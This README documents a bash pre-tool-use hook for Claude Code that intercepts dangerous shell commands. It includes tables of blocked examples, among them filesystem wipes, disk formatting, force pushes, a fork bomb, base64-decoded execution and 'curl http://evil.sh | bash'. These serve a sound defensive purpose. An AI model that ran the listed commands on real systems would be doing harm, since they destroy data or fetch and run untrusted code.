# 🛡️ Destructive Command Blocker — Claude Code Security Hook

A **Claude Code pre-tool-use hook** that protects your system and data by intercepting dangerous bash commands before they execute. 50+ security patterns across 9 risk categories.

## Quick Install

```bash
# One-line install
mkdir -p ~/.claude/hooks && curl -sSL https://raw.githubusercontent.com/lluisbernabeu/claude-builders-bounty/main/block-destructive.sh > ~/.claude/hooks/pre-tool-use && chmod +x ~/.claude/hooks/pre-tool-use

# Or manual
cp block-destructive.sh ~/.claude/hooks/pre-tool-use
chmod +x ~/.claude/hooks/pre-tool-use
```

## What It Blocks

### 🔴 BLOCKED (High Risk — Execution Prevented)

| Category | Pattern | Example |
|----------|---------|---------|
| **Filesystem** | `rm -rf /`, `rm -rf ~`, `chmod -R 000` | `rm -rf / --no-preserve-root` |
| **Database** | `DROP TABLE`, `DROP DATABASE`, `TRUNCATE`, `DELETE ... WHERE` | `DROP TABLE users` |
| **Git** | `git push --force`, `git reset --hard`, `git branch -D` | `git push --force origin main` |
| **Disk** | `mkfs.*`, `dd if=... of=`, `> /dev/sda` | `mkfs.ext4 /dev/sda1` |
| **Remote Code** | `curl ... \| bash`, `wget ... \| bash`, `eval $()` | `curl http://evil.sh | bash` |
| **Docker/K8s** | `docker system prune -a`, `kubectl delete namespace` | `docker system prune -a --volumes` |
| **Network** | `iptables -F`, `ufw disable` | `iptables -F && iptables -X` |
| **Fork Bombs** | `:(){ :|:& };:` | Shell fork bombs |
| **Encrypted** | Base64-encoded command execution | `echo <base64> | base64 -d | bash` |

### 🟡 WARN (Medium Risk — Warning Only)

| Pattern | Example |
|---------|---------|
| `git push --force-with-lease` | Safer force push, but warned |
| `ssh -o StrictHostKeyChecking=no` | Insecure SSH config |
| Chained dangerous commands | `rm -rf dir1 && rm -rf dir2` |

## Features

### 🎯 Pattern Matching Engine
- **50+ regex patterns** across 9 risk categories
- Case-insensitive matching
- Whitespace-flexible (handles extra spaces, tabs)
- Substring and exact matching strategies

### 📋 Comprehensive Logging
```
[BLOCKED] 2026-05-20 14:30:00 | user: dev | cwd: /app | reason: Force push (rewrites history) | cmd: git push --force origin main
[WARN] 2026-05-20 14:31:00 | user: dev | cwd: /app | reason: Insecure SSH config | cmd: ssh -o StrictHostKeyChecking=no user@host
```

### 🔧 Allowlist Support
Create `~/.claude/hooks/block-allowlist.txt`:
```bash
# One pattern per line (these will bypass the hook)
git push --force origin my-feature
docker system prune -a
```

### 🧪 Dry-Run Mode
Test without blocking:
```bash
bash block-destructive.sh --dry-run "DROP TABLE users"
# Output: [DRY-RUN] Would BLOCK: DROP TABLE users
```

### 🔬 Deep Inspection
- Detects **chained commands** hiding dangerous ops (`rm` after `&&`)
- Detects **base64-encoded** malicious payloads
- Detects **excessive recursion** patterns

## Testing

```bash
# Blocked patterns
bash block-destructive.sh "DROP TABLE users"         # Should block
bash block-destructive.sh "git push --force main"     # Should block
bash block-destructive.sh "rm -rf /some/dir"          # Should block (no root)

# Warning patterns
bash block-destructive.sh "git push --force-with-lease"  # Should warn

# Safe patterns
bash block-destructive.sh "ls -la"                    # Should allow
bash block-destructive.sh "git status"                # Should allow
bash block-destructive.sh "npm install"               # Should allow
bash block-destructive.sh "echo hello"                # Should allow

# Dry-run
bash block-destructive.sh --dry-run "DROP TABLE users"

# Verbose mode
bash block-destructive.sh --verbose "git commit -m 'fix'"
```

## Exit Codes

| Code | Meaning |
|------|---------|
| `0` | Command allowed (passed all checks) |
| `1` | Command blocked (security risk detected) |

## Files

| File | Purpose |
|------|---------|
| `~/.claude/hooks/pre-tool-use` | The hook script itself |
| `~/.claude/hooks/blocked.log` | All blocked/warn events |
| `~/.claude/hooks/block-allowlist.txt` | User-defined bypass patterns |
| `~/.claude/hooks/block-config.yaml` | (Future) Configuration file |

## Integration with Claude Code

The hook is automatically invoked by Claude Code's `pre-tool-use` hook system. No additional setup needed after installation.

**Architecture:**
```
Claude Code → pre-tool-use hook → block-destructive.sh → Safe: execute | Dangerous: block + log
```

## Requirements

- **Bash** 4.0+
- **Linux or macOS**
- **Claude Code** with hook system support
- No other dependencies
